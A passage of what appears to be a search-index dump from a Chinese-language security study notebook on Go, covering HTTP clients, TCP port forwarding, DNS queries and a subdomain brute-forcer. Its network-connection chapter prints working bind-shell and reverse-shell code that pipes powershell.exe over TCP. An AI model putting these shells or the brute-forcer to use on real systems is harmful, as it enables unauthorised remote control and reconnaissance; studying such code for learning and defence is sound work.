\u901a\u8fc7NewRequest\u81ea\u5b9a\u4e49\u8bf7\u6c42\u5934,\u793a\u4f8b\u5982\u4e0b: package main import ( \"encoding/json\" \"fmt\" \"log\" \"net/http\" ) type Result struct { Slideshow map [ string ] interface {} `json:\"slideshow\"` } func main () { req , err := http . NewRequest ( \"GET\" , \"https://httpbin.org/json\" , nil ) var client http . Client = http . Client {} req . Header . Add ( \"Accept\" , \"application/json\" ) resp , err := client . Do ( req ) if err != nil { log . Fatalln ( \"error:\" , err ) } defer resp . Body . Close () var result Result if err := json . NewDecoder ( resp . Body ). Decode ( & result ); err != nil { log . Fatalln ( \"error:\" , err ) } fmt . Printf ( \"%#v\\n\" , result ) } \u901a\u8fc7NewReuqest\u53d1\u9001\u5176\u4ed6\u8bf7\u6c42\u65b9\u6cd5, \u793a\u4f8b\u5982\u4e0b: package main import ( \"log\" \"net/http\" ) func main () { req , err := http . NewRequest ( \"DELETE\" , \"https://www.google.com/robots.txt\" , nil ) var client http . Client resp , err := client . Do ( req ) if err != nil { log . Fatalln ( \"error:\" , err ) } defer resp . Body . Close () } Client\u53ef\u4ee5\u63a7\u5236\u91cd\u5b9a\u5411, \u8d85\u65f6\u65f6\u95f4\u7b49,\u793a\u4f8b\u5982\u4e0b: package main import ( \"log\" \"net/http\" \"time\" ) func main () { req , err := http . NewRequest ( \"GET\" , \"https://www.google.com/robots.txt\" , nil ) var client http . Client = http . Client { CheckRedirect : func ( req * http . Request , via [] * http . Request ) error { // \u7981\u6b62\u91cd\u5b9a\u5411 return http . ErrUseLastResponse }, Timeout : time . Duration ( 90 * time . Second ), // 90\u79d2\u8d85\u65f6\u65f6\u95f4 } resp , err := client . Do ( req ) if err != nil { log . Fatalln ( \"error:\" , err ) } defer resp . Body . Close () }","title":"\u7b2c\u4e09\u7ae0-HTTP"},{"location":"%E5%AE%89%E5%85%A8/golang/%E7%AC%AC%E4%B8%89%E7%AB%A0-HTTP/#\u7b2c\u4e09\u7ae0-http","text":"","title":"\u7b2c\u4e09\u7ae0-HTTP"},{"location":"%E5%AE%89%E5%85%A8/golang/%E7%AC%AC%E4%B8%89%E7%AB%A0-HTTP/#\u4e86\u89e3nethttp\u5305","text":"\u6709\u4ee5\u4e0b\u51e0\u4e2a\u5e38\u7528\u7684\u51fd\u6570 Get(url string) (resp *Response, err error) Head(url string) (resp *Response, err error) Post(url string, bodyType string, body io.Reader) (resp *Response, err error) PostForm(url string, data url.Values) (resp *Response, err error) \u7b80\u5355\u5730\u53d1\u9001GET/POST\u8bf7\u6c42 package main import ( \"fmt\" \"io/ioutil\" \"log\" \"net/http\" \"net/url\" \"strings\" ) func main () { r1 , err := http . Get ( \"http://httpbin.org/get?a=1\" ) if err != nil { log . Fatalln ( \"Error: \" , err ) } defer r1 . Body . Close () body , err := ioutil . ReadAll ( r1 . Body ) if err != nil { log . Fatalln ( \"Error: \" , err ) } fmt . Println ( string ( body )) form := url . Values {} form . Add ( \"foo\" , \"bar\" ) r2 , err := http . Post ( \"http://httpbin.org/post\" , \"application/x-www-form-urlencoded\" , strings . NewReader ( form . Encode ()), ) if err != nil { log . Fatalln ( \"Error: \" , err ) } defer r2 . Body . Close () r3 , err := http . PostForm ( \"http://httpbin.org/post\" , form , ) if err != nil { log . Fatalln ( \"Error: \" , err ) } defer r3 . Body . Close () }","title":"\u4e86\u89e3net/http\u5305"},{"location":"%E5%AE%89%E5%85%A8/golang/%E7%AC%AC%E4%B8%89%E7%AB%A0-HTTP/#\u901a\u8fc7newreuqestclient\u62d3\u5c55\u8bf7\u6c42","text":"NewRequest\u5b9a\u4e49\u4e3a: NewRequest(umethod, vurl string, wbody io.Reader) (req *Request, err error) \u901a\u8fc7NewRequest\u81ea\u5b9a\u4e49\u8bf7\u6c42\u5934,\u793a\u4f8b\u5982\u4e0b: package main import ( \"encoding/json\" \"fmt\" \"log\" \"net/http\" ) type Result struct { Slideshow map [ string ] interface {} `json:\"slideshow\"` } func main () { req , err := http . NewRequest ( \"GET\" , \"https://httpbin.org/json\" , nil ) var client http . Client = http . Client {} req . Header . Add ( \"Accept\" , \"application/json\" ) resp , err := client . Do ( req ) if err != nil { log . Fatalln ( \"error:\" , err ) } defer resp . Body . Close () var result Result if err := json . NewDecoder ( resp . Body ). Decode ( & result ); err != nil { log . Fatalln ( \"error:\" , err ) } fmt . Printf ( \"%#v\\n\" , result ) } \u901a\u8fc7NewReuqest\u53d1\u9001\u5176\u4ed6\u8bf7\u6c42\u65b9\u6cd5, \u793a\u4f8b\u5982\u4e0b: package main import ( \"log\" \"net/http\" ) func main () { req , err := http . NewRequest ( \"DELETE\" , \"https://www.google.com/robots.txt\" , nil ) var client http . Client resp , err := client . Do ( req ) if err != nil { log . Fatalln ( \"error:\" , err ) } defer resp . Body . Close () } Client\u53ef\u4ee5\u63a7\u5236\u91cd\u5b9a\u5411, \u8d85\u65f6\u65f6\u95f4\u7b49,\u793a\u4f8b\u5982\u4e0b: package main import ( \"log\" \"net/http\" \"time\" ) func main () { req , err := http . NewRequest ( \"GET\" , \"https://www.google.com/robots.txt\" , nil ) var client http . Client = http . Client { CheckRedirect : func ( req * http . Request , via [] * http . Request ) error { // \u7981\u6b62\u91cd\u5b9a\u5411 return http . ErrUseLastResponse }, Timeout : time . Duration ( 90 * time . Second ), // 90\u79d2\u8d85\u65f6\u65f6\u95f4 } resp , err := client . Do ( req ) if err != nil { log . Fatalln ( \"error:\" , err ) } defer resp . Body . Close () }","title":"\u901a\u8fc7NewReuqest/Client\u62d3\u5c55\u8bf7\u6c42"},{"location":"%E5%AE%89%E5%85%A8/golang/%E7%AC%AC%E4%BA%8C%E7%AB%A0-%E7%BD%91%E7%BB%9C%E8%BF%9E%E6%8E%A5/","tags":["golang"],"text":"\u7b2c\u4e8c\u7ae0-\u7f51\u7edc\u8fde\u63a5 # \u5efa\u7acbTCP\u8fde\u63a5\u4e0e\u4ee3\u7406 # \u7b80\u5355\u5730\u8fde\u63a5\u5230\u67d0\u4e2aip\u548c\u7aef\u53e3 package main import ( \"fmt\" \"net\" ) func main () { conn , err := net . Dial ( \"tcp\" , \"scanme.nmap.org:80\" ) defer conn . Close () if err == nil { fmt . Println ( \"Connect success\" ) } } \u7b80\u5355\u5730\u5b9e\u73b0\u7aef\u53e3\u8f6c\u53d1 package main import ( \"io\" \"log\" \"net\" \"strings\" ) func proxy ( conn net . Conn ) { dst , err := net . Dial ( \"tcp\" , \"localhost:80\" ) defer func () { dst . Close () conn . Close () }() if err != nil { log . Fatalf ( \"Error: %v\\n\" , err ) } go func () { if _ , err := io . Copy ( dst , conn ); err != nil && ! strings . Contains ( err . Error (), \"closed\" ) { log . Printf ( \"2 Error: %v\\n\" , err ) } }() if _ , err := io . Copy ( conn , dst ); err != nil && ! strings . Contains ( err . Error (), \"closed\" ) { log . Printf ( \"1 Error: %v\\n\" , err ) } } func main () { listener , err := net . Listen ( \"tcp\" , \":8888\" ) if err != nil { log . Fatalf ( \"Error: %v\\n\" , err ) } for { conn , err := listener . Accept () if err != nil { log . Fatalf ( \"Error: %v\\n\" , err ) } go proxy ( conn ) } } echo\u670d\u52a1\u5668\u7684\u4e09\u79cd\u5b9e\u73b0\u65b9\u5f0f # \u6700\u5e95\u5c42\u7684\u5b9e\u73b0\u65b9\u5f0f,\u4f7f\u7528 net.Conn.Read \u548c net.Conn.Write \u5e95\u5c42\u51fd\u6570 \u4f7f\u7528golang\u81ea\u5e26\u7684bufio\u5305,\u4f7f\u7528 bufio.NewReader.ReadString \u548c bufio.NewWriter.WriteString \u5b9e\u73b0,\u81ea\u5e26\u7f13\u5b58,\u5728\u5199\u5165\u7684\u65f6\u5019\u53ef\u80fd\u9700\u8981flush\u624d\u80fd\u7acb\u5373\u663e\u793a \u4f7f\u7528golang\u81ea\u5e26\u7684io\u5305,\u4f7f\u7528 io.Copy(dst *io.Writer, src *io.Reader) \u5b9e\u73b0,\u53ef\u4ee5\u81ea\u5df1\u5b9e\u73b0Reader\u548cWriter,\u53ea\u9700\u8981\u5b9e\u73b0 Read(b []byte) (int, error) \u6216 Write(b []byte) (int, error) \u5373\u53ef \u7b80\u5355\u4ee3\u7406\u7684\u5b9e\u73b0\u65b9\u5f0f # \u6838\u5fc3 \u4f7f\u7528net.Listen\u76d1\u542c\u7aef\u53e3\u5efa\u7acb\u670d\u52a1\u5668 \u5f53\u76d1\u542c\u5230\u65b0\u7684\u8fde\u63a5\u65f6\u4ea4\u7ed9\u4e00\u4e2a\u65b0\u7684\u534f\u7a0b\u5904\u7406 \u534f\u7a0b\u4e2d\u4f7f\u7528net.Dial\u8fde\u63a5\u5230\u9700\u8981\u4ee3\u7406\u7684\u76ee\u6807,\u5e76\u4f7f\u7528io.Copy\u5c06\u8bf7\u6c42\u6e90\u7684\u8bf7\u6c42\u53d1\u9001\u81f3\u76ee\u6807(\u8d77\u4e00\u4e2a\u65b0\u7684\u534f\u7a0b),\u5c06\u76ee\u6807\u7684\u54cd\u5e94\u53d1\u9001\u81f3\u8bf7\u6c42\u6e90 Golang\u6b63\u5411shell\u7684\u5b9e\u73b0\u65b9\u5f0f # \u6838\u5fc3 \u4f7f\u7528net.Listen\u76d1\u542c\u7aef\u53e3\u5efa\u7acb\u670d\u52a1\u5668 \u5f53\u76d1\u542c\u5230\u65b0\u7684\u8fde\u63a5\u65f6\u4ea4\u7ed9\u4e00\u4e2a\u65b0\u7684\u534f\u7a0b\u5904\u7406 \u534f\u7a0b\u5927\u81f4\u6d41\u7a0b import ( \"io\" \"log\" \"net\" \"os/exec\" ) func handle ( conn net . Conn ) { cmd := exec . Command ( \"powershell.exe\" ) rp , wp := io . Pipe () cmd . Stdin = conn // read input from conn cmd . Stdout = wp cmd . Stderr = wp go io . Copy ( conn , rp ) // read output to conn cmd . Run () conn . Close () } func handle2 ( conn net . Conn ) { // \u540e\u6765\u53d1\u73b0\u53ef\u4ee5\u76f4\u63a5\u8fd9\u6837 cmd := exec . Command ( \"powershell.exe\" ) cmd . Stdin = conn cmd . Stdout = conn cmd . Stderr = conn cmd . Run () conn . Close () } func main () { listener , err := net . Listen ( \"tcp\" , \":20080\" ) if err != nil { log . Fatalln ( \"Unable to bind to port\" ) } log . Println ( \"Listening on 0.0.0.0:20080\" ) for { conn , err := listener . Accept () if err != nil { log . Fatalln ( \"Unable to accept connetcion\" ) } go handle ( conn ) } } Golang\u53cd\u5411shell\u5b9e\u73b0\u65b9\u5f0f # \u6838\u5fc3 \u548c\u6b63\u5411shell\u4e00\u6837 import import ( \"io\" \"net\" \"os/exec\" ) func handle2 ( conn net . Conn ) { // \u540e\u6765\u53d1\u73b0\u53ef\u4ee5\u76f4\u63a5\u8fd9\u6837 cmd := exec . Command ( \"powershell.exe\" ) cmd . Stdin = conn cmd . Stdout = conn cmd . Stderr = conn cmd . Run () conn . Close () } func main () { reConn , _ := net . Dial ( \"tcp\" , \"127.0.0.1:8888\" ) handle2 ( reConn ); }","title":"\u7b2c\u4e8c\u7ae0-\u7f51\u7edc\u8fde\u63a5"},{"location":"%E5%AE%89%E5%85%A8/golang/%E7%AC%AC%E4%BA%8C%E7%AB%A0-%E7%BD%91%E7%BB%9C%E8%BF%9E%E6%8E%A5/#\u7b2c\u4e8c\u7ae0-\u7f51\u7edc\u8fde\u63a5","text":"","title":"\u7b2c\u4e8c\u7ae0-\u7f51\u7edc\u8fde\u63a5"},{"location":"%E5%AE%89%E5%85%A8/golang/%E7%AC%AC%E4%BA%8C%E7%AB%A0-%E7%BD%91%E7%BB%9C%E8%BF%9E%E6%8E%A5/#\u5efa\u7acbtcp\u8fde\u63a5\u4e0e\u4ee3\u7406","text":"\u7b80\u5355\u5730\u8fde\u63a5\u5230\u67d0\u4e2aip\u548c\u7aef\u53e3 package main import ( \"fmt\" \"net\" ) func main () { conn , err := net . Dial ( \"tcp\" , \"scanme.nmap.org:80\" ) defer conn . Close () if err == nil { fmt . Println ( \"Connect success\" ) } } \u7b80\u5355\u5730\u5b9e\u73b0\u7aef\u53e3\u8f6c\u53d1 package main import ( \"io\" \"log\" \"net\" \"strings\" ) func proxy ( conn net . Conn ) { dst , err := net . Dial ( \"tcp\" , \"localhost:80\" ) defer func () { dst . Close () conn . Close () }() if err != nil { log . Fatalf ( \"Error: %v\\n\" , err ) } go func () { if _ , err := io . Copy ( dst , conn ); err != nil && ! strings . Contains ( err . Error (), \"closed\" ) { log . Printf ( \"2 Error: %v\\n\" , err ) } }() if _ , err := io . Copy ( conn , dst ); err != nil && ! strings . Contains ( err . Error (), \"closed\" ) { log . Printf ( \"1 Error: %v\\n\" , err ) } } func main () { listener , err := net . Listen ( \"tcp\" , \":8888\" ) if err != nil { log . Fatalf ( \"Error: %v\\n\" , err ) } for { conn , err := listener . Accept () if err != nil { log . Fatalf ( \"Error: %v\\n\" , err ) } go proxy ( conn ) } }","title":"\u5efa\u7acbTCP\u8fde\u63a5\u4e0e\u4ee3\u7406"},{"location":"%E5%AE%89%E5%85%A8/golang/%E7%AC%AC%E4%BA%8C%E7%AB%A0-%E7%BD%91%E7%BB%9C%E8%BF%9E%E6%8E%A5/#echo\u670d\u52a1\u5668\u7684\u4e09\u79cd\u5b9e\u73b0\u65b9\u5f0f","text":"\u6700\u5e95\u5c42\u7684\u5b9e\u73b0\u65b9\u5f0f,\u4f7f\u7528 net.Conn.Read \u548c net.Conn.Write \u5e95\u5c42\u51fd\u6570 \u4f7f\u7528golang\u81ea\u5e26\u7684bufio\u5305,\u4f7f\u7528 bufio.NewReader.ReadString \u548c bufio.NewWriter.WriteString \u5b9e\u73b0,\u81ea\u5e26\u7f13\u5b58,\u5728\u5199\u5165\u7684\u65f6\u5019\u53ef\u80fd\u9700\u8981flush\u624d\u80fd\u7acb\u5373\u663e\u793a \u4f7f\u7528golang\u81ea\u5e26\u7684io\u5305,\u4f7f\u7528 io.Copy(dst *io.Writer, src *io.Reader) \u5b9e\u73b0,\u53ef\u4ee5\u81ea\u5df1\u5b9e\u73b0Reader\u548cWriter,\u53ea\u9700\u8981\u5b9e\u73b0 Read(b []byte) (int, error) \u6216 Write(b []byte) (int, error) \u5373\u53ef","title":"echo\u670d\u52a1\u5668\u7684\u4e09\u79cd\u5b9e\u73b0\u65b9\u5f0f"},{"location":"%E5%AE%89%E5%85%A8/golang/%E7%AC%AC%E4%BA%8C%E7%AB%A0-%E7%BD%91%E7%BB%9C%E8%BF%9E%E6%8E%A5/#\u7b80\u5355\u4ee3\u7406\u7684\u5b9e\u73b0\u65b9\u5f0f","text":"\u6838\u5fc3 \u4f7f\u7528net.Listen\u76d1\u542c\u7aef\u53e3\u5efa\u7acb\u670d\u52a1\u5668 \u5f53\u76d1\u542c\u5230\u65b0\u7684\u8fde\u63a5\u65f6\u4ea4\u7ed9\u4e00\u4e2a\u65b0\u7684\u534f\u7a0b\u5904\u7406 \u534f\u7a0b\u4e2d\u4f7f\u7528net.Dial\u8fde\u63a5\u5230\u9700\u8981\u4ee3\u7406\u7684\u76ee\u6807,\u5e76\u4f7f\u7528io.Copy\u5c06\u8bf7\u6c42\u6e90\u7684\u8bf7\u6c42\u53d1\u9001\u81f3\u76ee\u6807(\u8d77\u4e00\u4e2a\u65b0\u7684\u534f\u7a0b),\u5c06\u76ee\u6807\u7684\u54cd\u5e94\u53d1\u9001\u81f3\u8bf7\u6c42\u6e90","title":"\u7b80\u5355\u4ee3\u7406\u7684\u5b9e\u73b0\u65b9\u5f0f"},{"location":"%E5%AE%89%E5%85%A8/golang/%E7%AC%AC%E4%BA%8C%E7%AB%A0-%E7%BD%91%E7%BB%9C%E8%BF%9E%E6%8E%A5/#golang\u6b63\u5411shell\u7684\u5b9e\u73b0\u65b9\u5f0f","text":"\u6838\u5fc3 \u4f7f\u7528net.Listen\u76d1\u542c\u7aef\u53e3\u5efa\u7acb\u670d\u52a1\u5668 \u5f53\u76d1\u542c\u5230\u65b0\u7684\u8fde\u63a5\u65f6\u4ea4\u7ed9\u4e00\u4e2a\u65b0\u7684\u534f\u7a0b\u5904\u7406 \u534f\u7a0b\u5927\u81f4\u6d41\u7a0b import ( \"io\" \"log\" \"net\" \"os/exec\" ) func handle ( conn net . Conn ) { cmd := exec . Command ( \"powershell.exe\" ) rp , wp := io . Pipe () cmd . Stdin = conn // read input from conn cmd . Stdout = wp cmd . Stderr = wp go io . Copy ( conn , rp ) // read output to conn cmd . Run () conn . Close () } func handle2 ( conn net . Conn ) { // \u540e\u6765\u53d1\u73b0\u53ef\u4ee5\u76f4\u63a5\u8fd9\u6837 cmd := exec . Command ( \"powershell.exe\" ) cmd . Stdin = conn cmd . Stdout = conn cmd . Stderr = conn cmd . Run () conn . Close () } func main () { listener , err := net . Listen ( \"tcp\" , \":20080\" ) if err != nil { log . Fatalln ( \"Unable to bind to port\" ) } log . Println ( \"Listening on 0.0.0.0:20080\" ) for { conn , err := listener . Accept () if err != nil { log . Fatalln ( \"Unable to accept connetcion\" ) } go handle ( conn ) } }","title":"Golang\u6b63\u5411shell\u7684\u5b9e\u73b0\u65b9\u5f0f"},{"location":"%E5%AE%89%E5%85%A8/golang/%E7%AC%AC%E4%BA%8C%E7%AB%A0-%E7%BD%91%E7%BB%9C%E8%BF%9E%E6%8E%A5/#golang\u53cd\u5411shell\u5b9e\u73b0\u65b9\u5f0f","text":"\u6838\u5fc3 \u548c\u6b63\u5411shell\u4e00\u6837 import import ( \"io\" \"net\" \"os/exec\" ) func handle2 ( conn net . Conn ) { // \u540e\u6765\u53d1\u73b0\u53ef\u4ee5\u76f4\u63a5\u8fd9\u6837 cmd := exec . Command ( \"powershell.exe\" ) cmd . Stdin = conn cmd . Stdout = conn cmd . Stderr = conn cmd . Run () conn . Close () } func main () { reConn , _ := net . Dial ( \"tcp\" , \"127.0.0.1:8888\" ) handle2 ( reConn ); }","title":"Golang\u53cd\u5411shell\u5b9e\u73b0\u65b9\u5f0f"},{"location":"%E5%AE%89%E5%85%A8/golang/%E7%AC%AC%E4%BA%94%E7%AB%A0-DNS/","tags":["golang"],"text":"\u7b2c\u4e94\u7ae0-DNS # \u4e3b\u8981\u5b66\u4e60 dns \u8fd9\u4e2a\u7b2c\u4e09\u5305\u7684\u4f7f\u7528 FQDN # \u4e00\u4e2a\u7b80\u5355\u7684dns\u7684 fully qualified domain name (fqdn)\u8bf7\u6c42,\u4f7f\u7528A\u8bb0\u5f55,\u5e76\u8f93\u51fa\u7ed3\u679c package main import ( \"fmt\" \"github.com/miekg/dns\" ) func main () { var msg dns . Msg fqdn := dns . Fqdn ( \"stacktitan.com\" ) msg . SetQuestion ( fqdn , dns . TypeA ) in , err := dns . Exchange ( & msg , \"8.8.8.8:53\" ) if err != nil { panic ( err ) } if len ( in . Answer ) < 1 { fmt . Println ( \"No records\" ) return } for _ , answer := range in . Answer { if a , ok := answer .( * dns . A ); ok { fmt . Println ( a . A ) } } } \u7b80\u5355\u5730\u5206\u6790\u4e00\u4e0b, in \u8fd9\u4e2a\u53d8\u91cf\u7c7b\u578b\u662fdns.Msg,\u800cMsg\u7684\u7ed3\u6784\u5982\u4e0b type Msg struct { MsgHdr Compress bool `json:\"-\"` // If true, the message will be compressed... u Question [] Question // Holds the RR(s) of the question section. v Answer [] RR // Holds the RR(s) of the answer section. Ns [] RR // Holds the RR(s) of the authority section. Extra [] RR // Holds the RR(s) of the additional section. } \u800cRR\u5219\u662f\u4e00\u4e2a\u63a5\u53e3,\u9700\u8981\u5b9e\u73b0\u4ee5\u4e0b\u51e0\u4e2a\u65b9\u6cd5 type RR interface { // Header returns the header of an resource record. The header contains // everything up to the rdata. Header () * RR_Header // String returns the text representation of the resource record. String () string // copy returns a copy of the RR copy () RR // len returns the length (in octets) of the compressed or uncompressed RR in wire format. // // If compression is nil, the uncompressed size will be returned, otherwise the compressed // size will be returned and domain names will be added to the map for future compression. len ( off int , compression map [ string ] struct {}) int // pack packs the records RDATA into wire format. The header will // already have been packed into msg. pack ( msg [] byte , off int , compression compressionMap , compress bool ) ( off1 int , err error ) // unpack unpacks an RR from wire format. // // This will only be called on a new and empty RR type with only the header populated. It // will only be called if the record's RDATA is non-empty. unpack ( msg [] byte , off int ) ( off1 int , err error ) // parse parses an RR from zone file format. // // This will only be called on a new and empty RR type with only the header populated. parse ( c * zlexer , origin string ) * ParseError // isDuplicate returns whether the two RRs are duplicates. isDuplicate ( r2 RR ) bool } \u6700\u540e\u904d\u5386answer(\u53d8\u91cf\u7c7b\u578b\u662fRR),\u8fd9\u91cc\u6709\u4e00\u4e2a\u5f3a\u5236\u8f6c\u6362 a, ok := answer.(*dns.A); ok ,\u5c06RR\u7c7b\u578b\u5f3a\u5236\u8f6c\u6362\u4e3a*dns.A,\u800cdns.A\u7684\u76f8\u5173\u7ed3\u6784\u53c8\u5982\u4e0b,\u53ef\u4ee5\u770b\u5230dns.A\u7ec4\u5408\u4e86RR Header\u8fd9\u4e2a\u7c7b\u578b,\u800cRR Header\u5b9e\u73b0\u4e86RR\u7684\u65b9\u6cd5,\u56e0\u6b64dns.A\u53ef\u4ee5\u662fRR\u7c7b\u578b // A RR. See RFC 1035. type A struct { Hdr RR_Header A net . IP `dns:\"a\"` } // RR_Header is the header all DNS resource records share. type RR_Header struct { Name string `dns:\"cdomain-name\"` Rrtype uint16 Class uint16 Ttl uint32 Rdlength uint16 // Length of data after header. } // Header returns itself. This is here to make RR_Header implements the RR interface. func ( h * RR_Header ) Header () * RR_Header { return h } // Just to implement the RR interface. func ( h * RR_Header ) copy () RR { return nil } // ... subdomain_fuzzer # \u53c2\u8003blackhat-go\u91ccsubdomain_guesser\u5199\u7684,\u4e00\u4e2a\u7b80\u5355\u7684\u6839\u636e\u5b57\u5178\u901a\u8fc7dns\u67e5\u8be2\u7206\u7834\u5b50\u57df\u540d\u7684\u5de5\u5177,\u6838\u5fc3\u57fa\u672c\u4e00\u6837,\u4f46\u662f\u7531\u4e8e\u539f\u4f5c\u8005\u5199\u7684\u534f\u7a0b\u5e76\u53d1\u4ee3\u7801\u6709\u70b9\u96be\u4ee5\u7406\u89e3,\u6240\u4ee5\u7a0d\u5fae\u4fee\u6539\u4e86\u4e00\u4e0b,\u4f7f\u7528\u4e86 sizedwaitgroup \u8fd9\u4e2a\u5305 package main import ( \"bufio\" \"errors\" \"flag\" \"fmt\" \"os\" \"github.com/miekg/dns\" \"github.com/remeh/sizedwaitgroup\" ) // type Result struct { IpAddress string Hostname string } // func LookupA ( fqdn , serverAddr string ) ([] string , error ) { var m dns . Msg var ips [] string m . SetQuestion ( dns . Fqdn ( fqdn ), dns . TypeA ) in , err := dns . Exchange ( & m , serverAddr ) if err != nil { return ips , err } if len ( in . Answer ) < 1 { return ips , errors . New ( \"No answer\" ) } for _ , answer := range in . Answer { if a , ok := answer .( * dns . A ); ok { ips = append ( ips , a . A . String ()) } } return ips , nil } func LookupCNAME ( fqdn , serverAddr string ) ([] string , error ) { var m dns . Msg var fqdns [] string m . SetQuestion ( dns . Fqdn ( fqdn ), dns . TypeCNAME ) in , err := dns . Exchange ( & m , serverAddr ) if err != nil { return fqdns , err } if len ( in . Answer ) < 1 { return fqdns , errors . New ( \"No answer\" ) } for _ , answer := range in . Answer { if c , ok := answer .( * dns . CNAME ); ok { fqdns = append ( fqdns , c . Target ) } } return fqdns , nil } // func Lookup ( fqdn , serverAddr string ) [] Result { var results [] Result var cfqdn = fqdn for { cnames , err := LookupCNAME ( cfqdn , serverAddr ) if err == nil && len ( cnames ) > 0 { cfqdn = cnames [ 0 ] continue } ips , err := LookupA ( cfqdn , serverAddr ) if err != nil { break } for _ , ip := range ips { results = append ( results , Result { IpAddress : ip , Hostname : fqdn , }) } break } return results } func worker ( fqdn string , serverAddr string , resultChannel chan [] Result , swg * sizedwaitgroup . SizedWaitGroup ) { results := Lookup ( fqdn , serverAddr ) if len ( results ) > 0 { resultChannel <- results } return } func main () { var ( flDomain = flag . String ( \"domain\" , \"\" , \"The domain to perform fuzzing against.\" ) flWordlist = flag . String ( \"wordlist\" , \"\" , \"The wordlist to use for fuzzing\" ) flWorkerCount = flag . Int ( \"c\" , 100 , \"The amount of worker to use\" ) flServerAddr = flag . String ( \"server\" , \"8.8.8.8:53\" , \"The DNS server to use\" ) ) flag . Parse () if * flDomain == \"\" || * flWordlist == \"\" { fmt . Println ( \"domain and wordlist are rquired\" ) os . Exit ( 1 ) } swg := sizedwaitgroup . New ( * flWorkerCount ) resultsChannel := make ( chan [] Result ) var results [] Result go func () { // ? read from channel immediately for r := range resultsChannel { for _ , result := range r { fmt . Printf ( \"%s\\t%s\\n\" , result . Hostname , result . IpAddress ) } results = append ( results , r ... ) swg . Done () } }() fh , err := os . Open ( * flWordlist ) if err != nil { fmt . Println ( \"Cannot read \" + * flWordlist ) os . Exit ( 2 ) } defer fh . Close () reader := bufio . NewReader ( fh ) for { bytes , _ , err := reader . ReadLine () line := string ( bytes [:]) if err != nil { break } swg . Add () go worker ( fmt . Sprintf ( \"%s.%s\" , line , * flDomain ), * flServerAddr , resultsChannel , & swg ) } swg . Wait () close ( resultsChannel ) fmt . Println ( \"\\nResult:\\n-----------------------------------------------\" ) for _ , r := range results { fmt . Printf ( \"%s\\t%s\\n\" , r . Hostname , r . IpAddress ) } }","title":"\u7b2c\u4e94\u7ae0-DNS"},{"location":"%E5%AE%89%E5%85%A8/golang/%E7%AC%AC%E4%BA%94%E7%AB%A0-DNS/#\u7b2c\u4e94\u7ae0-dns","text":"\u4e3b\u8981\u5b66\u4e60 dns \u8fd9\u4e2a\u7b2c\u4e09\u5305\u7684\u4f7f\u7528","title":"\u7b2c\u4e94\u7ae0-DNS"},{"location":"%E5%AE%89%E5%85%A8/golang/%E7%AC%AC%E4%BA%94%E7%AB%A0-DNS/#fqdn","text":"\u4e00\u4e2a\u7b80\u5355\u7684dns\u7684 fully qualified domain name (fqdn)\u8bf7\u6c42,\u4f7f\u7528A\u8bb0\u5f55,\u5e76\u8f93\u51fa\u7ed3\u679c package main import ( \"fmt\" \"github.com/miekg/dns\" ) func main () { var msg dns . Msg fqdn := dns . Fqdn ( \"stacktitan.com\" ) msg . SetQuestion ( fqdn , dns . TypeA ) in , err := dns . Exchange ( & msg , \"8.8.8.8:53\" ) if err != nil { panic ( err ) } if len ( in . Answer ) < 1 { fmt . Println ( \"No records\" ) return } for _ , answer := range in . Answer { if a , ok := answer .( * dns . A ); ok { fmt . Println ( a . A ) } } } \u7b80\u5355\u5730\u5206\u6790\u4e00\u4e0b, in \u8fd9\u4e2a\u53d8\u91cf\u7c7b\u578b\u662fdns.Msg,\u800cMsg\u7684\u7ed3\u6784\u5982\u4e0b type Msg struct { MsgHdr Compress bool `json:\"-\"` // If true, the message will be compressed... u Question [] Question // Holds the RR(s) of the question section. v Answer [] RR // Holds the RR(s) of the answer section. Ns [] RR // Holds the RR(s) of the authority section. Extra [] RR // Holds the RR(s) of the additional section. } \u800cRR\u5219\u662f\u4e00\u4e2a\u63a5\u53e3,\u9700\u8981\u5b9e\u73b0\u4ee5\u4e0b\u51e0\u4e2a\u65b9\u6cd5 type RR interface { // Header returns the header of an resource record. The header contains // everything up to the rdata. Header () * RR_Header // String returns the text representation of the resource record. String () string // copy returns a copy of the RR copy () RR // len returns the length (in octets) of the compressed or uncompressed RR in wire format. // // If compression is nil, the uncompressed size will be returned, otherwise the compressed // size will be returned and domain names will be added to the map for future compression. len ( off int , compression map [ string ] struct {}) int // pack packs the records RDATA into wire format. The header will // already have been packed into msg. pack ( msg [] byte , off int , compression compressionMap , compress bool ) ( off1 int , err error ) // unpack unpacks an RR from wire format. // // This will only be called on a new and empty RR type with only the header populated. It // will only be called if the record's RDATA is non-empty. unpack ( msg [] byte , off int ) ( off1 int , err error ) // parse parses an RR from zone file format. // // This will only be called on a new and empty RR type with only the header populated. parse ( c * zlexer , origin string ) * ParseError // isDuplicate returns whether the two RRs are duplicates. isDuplicate ( r2 RR ) bool } \u6700\u540e\u904d\u5386answer(\u53d8\u91cf\u7c7b\u578b\u662fRR),\u8fd9\u91cc\u6709\u4e00\u4e2a\u5f3a\u5236\u8f6c\u6362 a, ok := answer.(*dns.A); ok ,\u5c06RR\u7c7b\u578b\u5f3a\u5236\u8f6c\u6362\u4e3a*dns.A,\u800cdns.A\u7684\u76f8\u5173\u7ed3\u6784\u53c8\u5982\u4e0b,\u53ef\u4ee5\u770b\u5230dns.A\u7ec4\u5408\u4e86RR Header\u8fd9\u4e2a\u7c7b\u578b,\u800cRR Header\u5b9e\u73b0\u4e86RR\u7684\u65b9\u6cd5,\u56e0\u6b64dns.A\u53ef\u4ee5\u662fRR\u7c7b\u578b // A RR. See RFC 1035. type A struct { Hdr RR_Header A net . IP `dns:\"a\"` } // RR_Header is the header all DNS resource records share. type RR_Header struct { Name string `dns:\"cdomain-name\"` Rrtype uint16 Class uint16 Ttl uint32 Rdlength uint16 // Length of data after header. } // Header returns itself. This is here to make RR_Header implements the RR interface. func ( h * RR_Header ) Header () * RR_Header { return h } // Just to implement the RR interface. func ( h * RR_Header ) copy () RR { return nil } // 